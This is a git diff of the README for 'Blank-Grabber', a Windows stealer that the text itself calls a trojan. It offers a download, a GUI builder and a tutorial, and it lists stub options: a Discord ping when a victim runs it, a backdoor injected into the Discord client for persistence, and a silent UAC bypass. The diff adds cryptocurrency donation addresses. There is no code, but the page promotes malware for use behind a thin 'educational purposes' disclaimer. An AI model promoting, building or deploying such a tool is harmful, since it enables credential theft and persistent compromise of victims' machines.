@@ -20,14 +20,17 @@
 </p>
 
 ## Table of Contents
+
 - [Download](#download)
 - [Features](#features)
 - [Stub Settings](#stub-settings)
 - [Requirements](#requirements)
 - [How to Build?](#how-to-build)
-- [Contact me](#contact-me)
+- [Contact Me](#contact-me)
+- [Support the Project](#support-the-project)
 
 ## Download
+
 [![Download](https://img.shields.io/badge/Download-Now-Green?style=for-the-badge&logo=appveyor)](https://github.com/Blank-c/Blank-Grabber/archive/refs/heads/main.zip)
 
 **Disclaimer:** This program is provided for educational and research purposes only. The creator of this program does not condone or support any illegal or malicious activity, and will not be held responsible for any such actions taken by others who may use this program. By downloading or using this program, you acknowledge that you are solely responsible for any consequences that may result from the use of this program.
@@ -35,6 +38,7 @@
 **Note:** If the grabber doesn't work, then try to build it again without the "Anti VM" option.
 
 ## Features
+
     • GUI Builder.
     • UAC Bypass.
     • Custom Icon.
@@ -67,6 +71,7 @@
     (...more)
 
 ## Stub Settings
+
 | Option | Description |
 | ------ | ----------- |
 | **Ping Me** | Pings [@everyone](https://www.remote.tools/remote-work/discord-everyone-here#what-is-everyone) when someone runs the stub. |
@@ -78,9 +83,10 @@
 | **Discord Injection** | Puts backdoor on the Discord client for persistence. |
 | **UAC Bypass** | Tries to get administrator permissions without showing a prompt. |
 
-**Supports:** *Windows OS (Tested on Windows 10).*
+**Supports:** *Windows 8+ (Tested on Windows 10).*
 
 ## Requirements
+
 **To build the stub, you need:**
 - Windows 10.
 - Python 3.10+.
@@ -97,7 +103,24 @@
 
 [![Tutorial video](https://img.shields.io/badge/Watch-Tutorial-blue?style=for-the-badge&logo=youtube)](https://streamable.com/r9sa14)
 
-## Contact me
+## Contact Me
+
 To remove this trojan from your system, follow [this](https://github.com/Blank-c/Blank-Grabber/issues/142). 
 
 Join my [Telegram group](https://t.me/+h0jwMBN5Lfc2ZTdl).
+
+## Support the Project
+
+If you find this project useful and would like to show your support, you can make a donation using the following cryptocurrencies:
+
+- **Bitcoin (BTC):**
+  - Wallet Address: bc1quyf7d2cwrd0rgtyhtjt7ermxlw4hzg8npr4yce
+
+- **Ethereum (ETH):**
+  - Wallet Address: 0x54Ab5743141c781178863e3F658d48Cb9564f520
+
+- **USDT (Tron network):**
+  - Wallet Address: TJsixSZ9LDpn3ZNF8pEKmfNaNkMTrK1hWJ
+
+Your contributions will help support ongoing development, maintenance, and improvement of this project. Thank you for your generosity!
+
